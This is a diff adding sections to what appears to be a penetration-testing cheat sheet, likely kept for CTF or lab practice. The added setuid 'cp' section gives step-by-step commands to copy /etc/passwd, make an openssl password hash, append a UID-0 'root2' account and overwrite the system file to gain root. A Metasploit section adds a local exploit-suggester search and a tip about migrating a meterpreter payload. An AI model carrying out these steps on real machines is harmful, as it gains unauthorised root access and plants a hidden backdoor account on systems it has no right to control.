@@ -263,9 +263,43 @@ Add pspy!
 
 #### Setuid Binaries and Capabilities
 
+##### cp
+```
+cat /etc/passwd > passwd.orig
+```
+New password:
+```
+openssl passwd <Enter your password>
+```
+
+Add the new user to passwd.orig
+```
+echo "root2:<openssl(your_password)>:0:0:root:/root:/bin/bash" >> passwd.orig
+```
+
+Copy your new passwd file:
+```
+cp passwd.orig /etc/passwd
+```
+
+Su root2!
+```
+su root2
+```
+
 #### Kernel Exploits
 
+##### Dirty Pipe
+
+##### Polkit
+
 # Metasploit
+
+Privilege Escalation
+```
+search local_exploit_suggester
+```
+NOTE: Remember to use migrate to move the execution of the meterpreter payload.
 
 # Exfiltration Data
 
